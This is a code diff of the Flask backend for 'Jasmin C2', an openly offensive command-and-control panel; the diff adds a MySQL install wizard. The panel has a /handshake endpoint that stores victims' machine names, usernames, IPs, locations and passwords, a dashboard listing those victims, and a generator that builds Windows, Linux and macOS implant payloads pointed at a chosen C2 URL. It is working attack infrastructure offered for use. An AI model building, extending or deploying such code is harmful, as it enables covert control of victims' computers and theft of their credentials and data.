@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-"""Jasmin C2 — Python Flask Backend"""
-import os, secrets, hashlib, datetime, shutil
+"""Jasmin C2 — Python Flask Backend with MySQL + Web Install Wizard"""
+import os, secrets, json, datetime
 from functools import wraps
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, flash
 from flask_sqlalchemy import SQLAlchemy
@@ -8,16 +8,29 @@ from werkzeug.security import generate_password_hash, check_password_hash
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
-app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///jasmin.db')
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-app.config['HANDSHAKE_SECRET'] = os.environ.get('HANDSHAKE_SECRET', 'jasmin@123')
 
-db = SQLAlchemy(app)
+CONFIG_FILE = os.path.join(os.path.dirname(__file__), 'config.json')
 PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), 'payloads')
 TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), 'templates', 'payloads')
 os.makedirs(PAYLOAD_DIR, exist_ok=True)
 
-# ── Models ──
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        return json.load(open(CONFIG_FILE))
+    return {}
+
+def is_installed():
+    cfg = load_config()
+    return cfg.get('installed', False)
+
+cfg = load_config()
+db_url = cfg.get('database_url', os.environ.get('DATABASE_URL', 'sqlite:///jasmin.db'))
+app.config['SQLALCHEMY_DATABASE_URI'] = db_url
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.config['HANDSHAKE_SECRET'] = cfg.get('handshake_secret', os.environ.get('HANDSHAKE_SECRET', 'jasmin@123'))
+
+db = SQLAlchemy(app)
+
 class Admin(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(255), unique=True, nullable=False)
@@ -44,15 +57,65 @@ def login_required(f):
         return f(*args, **kw)
     return decorated
 
-# ── Routes: Auth ──
+# ── Install Wizard ──
+@app.route('/install', methods=['GET','POST'])
+def install():
+    if is_installed():
+        return redirect(url_for('login'))
+    step = request.args.get('step', 1, type=int)
+    error = ''
+    if request.method == 'POST':
+        if step == 2:
+            host = request.form.get('db_host','localhost')
+            port = request.form.get('db_port','3306')
+            name = request.form.get('db_name','jasmin_db')
+            user = request.form.get('db_user','')
+            pw = request.form.get('db_pass','')
+            secret = request.form.get('secret','jasmin@123')
+            url = f'mysql+pymysql://{user}:{pw}@{host}:{port}/{name}?charset=utf8mb4'
+            try:
+                import pymysql
+                conn = pymysql.connect(host=host,port=int(port),user=user,password=pw)
+                cur = conn.cursor()
+                cur.execute(f"CREATE DATABASE IF NOT EXISTS `{name}` DEFAULT CHARACTER SET utf8mb4")
+                conn.close()
+                cfg = {'database_url':url,'handshake_secret':secret,'installed':False}
+                json.dump(cfg, open(CONFIG_FILE,'w'))
+                app.config['SQLALCHEMY_DATABASE_URI'] = url
+                app.config['HANDSHAKE_SECRET'] = secret
+                db.engine.dispose()
+                with app.app_context():
+                    db.create_all()
+                return redirect(url_for('install', step=3))
+            except Exception as e:
+                error = f'数据库连接失败: {e}'
+        elif step == 3:
+            au = request.form.get('admin_user','admin')
+            ap_ = request.form.get('admin_pass','')
+            ap2 = request.form.get('admin_pass2','')
+            if len(ap_) < 6: error = '密码至少6位'
+            elif ap_ != ap2: error = '两次密码不一致'
+            else:
+                with app.app_context():
+                    Admin.query.filter_by(username=au).delete()
+                    db.session.add(Admin(username=au, password=generate_password_hash(ap_)))
+                    db.session.commit()
+                cfg = load_config()
+                cfg['installed'] = True
+                json.dump(cfg, open(CONFIG_FILE,'w'))
+                return redirect(url_for('install', step=4))
+    return render_template('install.html', step=step, error=error)
+
+# ── Auth ──
 @app.route('/')
 def index():
+    if not is_installed(): return redirect(url_for('install'))
     return redirect(url_for('login'))
 
 @app.route('/login', methods=['GET','POST'])
 def login():
-    if 'username' in session:
-        return redirect(url_for('dashboard'))
+    if not is_installed(): return redirect(url_for('install'))
+    if 'username' in session: return redirect(url_for('dashboard'))
     if request.method == 'POST':
         u = request.form.get('username','')
         p = request.form.get('password','')
@@ -68,7 +131,7 @@ def logout():
     session.clear()
     return redirect(url_for('login'))
 
-# ── Routes: Dashboard ──
+# ── Dashboard ──
 @app.route('/dashboard')
 @login_required
 def dashboard():
@@ -88,32 +151,27 @@ def dashboard():
     return render_template('dashboard.html', victims=victims, page=page,
         total_pages=total_pages, total=total, search=search)
 
-# ── Routes: Handshake (victim callback) ──
+# ── Handshake ──
 @app.route('/handshake', methods=['POST'])
 def handshake():
     if request.form.get('handshake') != app.config['HANDSHAKE_SECRET']:
         return 'Invalid', 403
-    v = Victim(
-        machine_name=request.form.get('machine_name',''),
+    v = Victim(machine_name=request.form.get('machine_name',''),
         computer_user=request.form.get('computer_user',''),
-        os=request.form.get('os',''),
-        date=request.form.get('date',''),
-        time=request.form.get('time',''),
-        ip=request.form.get('ip', request.remote_addr),
-        location=request.form.get('location',''),
-        systemid=request.form.get('systemid',''),
+        os=request.form.get('os',''), date=request.form.get('date',''),
+        time=request.form.get('time',''), ip=request.form.get('ip',request.remote_addr),
+        location=request.form.get('location',''), systemid=request.form.get('systemid',''),
         password=request.form.get('password',''))
-    db.session.add(v)
-    db.session.commit()
+    db.session.add(v); db.session.commit()
     return 'handshake completed'
 
-# ── Routes: Payload Generator ──
+# ── Payload Generator ──
 @app.route('/generate', methods=['POST'])
 @login_required
 def generate():
     plat = request.form.get('platform','')
     c2 = request.form.get('c2_url','')
-    secret = request.form.get('secret', app.config['HANDSHAKE_SECRET'])
+    sec = request.form.get('secret', app.config['HANDSHAKE_SECRET'])
     if plat not in ('win','linux','macos'):
         return jsonify(ok=False, msg='Invalid platform')
     ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
@@ -122,29 +180,19 @@ def generate():
     ext_map = {'win':'.cs','linux':'.py','macos':'.py'}
     tpl_path = os.path.join(TEMPLATE_DIR, tpl_map[plat])
     if not os.path.exists(tpl_path):
-        return jsonify(ok=False, msg='Template not found')
-    tpl = open(tpl_path).read()
-    tpl = tpl.replace('{{C2_URL}}', c2).replace('{{HANDSHAKE}}', secret)
+        return jsonify(ok=False, msg='Template missing')
+    tpl = open(tpl_path).read().replace('{{C2_URL}}',c2).replace('{{HANDSHAKE}}',sec)
     name = f'jasmin_{plat}_{ts}_{tok}{ext_map[plat]}'
-    out = os.path.join(PAYLOAD_DIR, name)
-    with open(out, 'w') as f:
-        f.write(tpl)
-    return jsonify(ok=True, file=name, platform=plat, size=os.path.getsize(out))
+    with open(os.path.join(PAYLOAD_DIR, name), 'w') as f: f.write(tpl)
+    return jsonify(ok=True, file=name, platform=plat, size=os.path.getsize(os.path.join(PAYLOAD_DIR,name)))
 
 @app.route('/payloads/<path:filename>')
 @login_required
 def download_payload(filename):
     return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)
 
-# ── Init DB + default admin ──
-def init_db():
-    db.create_all()
-    if not Admin.query.first():
-        pw = os.environ.get('ADMIN_PASSWORD', 'ChangeMe!2024')
-        db.session.add(Admin(username='admin', password=generate_password_hash(pw)))
-        db.session.commit()
-
+# ── Startup ──
 if __name__ == '__main__':
-    with app.app_context():
-        init_db()
+    if is_installed():
+        with app.app_context(): db.create_all()
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
